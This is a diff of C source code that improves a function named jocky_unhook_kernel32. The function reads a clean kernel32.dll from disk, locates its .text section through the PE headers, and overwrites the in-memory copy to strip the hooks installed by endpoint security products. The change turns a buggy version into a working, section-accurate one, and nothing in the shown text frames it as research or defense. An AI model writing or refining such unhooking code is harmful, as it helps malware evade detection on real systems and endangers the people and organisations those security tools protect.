@@ -18,41 +18,67 @@
 typedef NTSTATUS (WINAPI *pNtSetInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);
 typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 
-unsigned char jocky_unhook_kernel32() {
-    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
+unsigned char jocky_unhook_kernel32(void) {
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (!hKernel32) return 0;
 
-    MODULEINFO mi;
-    if (!GetModuleInformation(GetCurrentProcess(), hKernel32, &mi, sizeof(mi))) {
-        return 0;
-    }
-
-    // Read clean copy from disk
-    HANDLE hFile = CreateFile("C:\\Windows\\System32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\kernel32.dll",
+                               GENERIC_READ, FILE_SHARE_READ, NULL,
+                               OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return 0;
 
-    DWORD bytesRead = 0;
-    DWORD moduleSize = GetFileSize(hFile, NULL);
-    if (moduleSize == INVALID_FILE_SIZE || moduleSize == 0) {
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
         CloseHandle(hFile);
         return 0;
     }
-    unsigned char* clean_module = (unsigned char*)malloc(moduleSize);
 
-    if (!ReadFile(hFile, clean_module, moduleSize, &bytesRead, NULL)) {
-        free(clean_module);
+    unsigned char* diskBuf = (unsigned char*)VirtualAlloc(NULL, fileSize,
+                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!diskBuf) { CloseHandle(hFile); return 0; }
+
+    DWORD bytesRead = 0;
+    if (!ReadFile(hFile, diskBuf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        VirtualFree(diskBuf, 0, MEM_RELEASE);
         CloseHandle(hFile);
         return 0;
     }
     CloseHandle(hFile);
 
-    // Copy clean module sections over hooked memory
-    DWORD oldProtect;
-    VirtualProtect(mi.lpBaseOfDll, moduleSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-    memcpy(mi.lpBaseOfDll, clean_module, moduleSize);
-    VirtualProtect(mi.lpBaseOfDll, moduleSize, oldProtect, &oldProtect);
+    /* Parse disk copy and find .text section offset + size */
+    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)diskBuf;
+    PIMAGE_NT_HEADERS ntHdr  = (PIMAGE_NT_HEADERS)(diskBuf + dosHdr->e_lfanew);
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
 
-    free(clean_module);
+    unsigned char* diskText = NULL;
+    DWORD textRawSize = 0;
+    DWORD textRVA = 0;
+    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
+        if (memcmp(sec[i].Name, ".text", 5) == 0) {
+            diskText    = diskBuf + sec[i].PointerToRawData;
+            textRawSize = sec[i].SizeOfRawData;
+            textRVA     = sec[i].VirtualAddress;
+            break;
+        }
+    }
+
+    if (!diskText || textRawSize == 0) {
+        VirtualFree(diskBuf, 0, MEM_RELEASE);
+        return 0;
+    }
+
+    /* Patch only the .text section in the in-memory image using its RVA */
+    unsigned char* memText = (unsigned char*)hKernel32 + textRVA;
+    DWORD oldProtect = 0;
+    if (!VirtualProtect(memText, textRawSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(diskBuf, 0, MEM_RELEASE);
+        return 0;
+    }
+
+    memcpy(memText, diskText, textRawSize);
+    VirtualProtect(memText, textRawSize, oldProtect, &oldProtect);
+
+    VirtualFree(diskBuf, 0, MEM_RELEASE);
     return 1;
 }
 
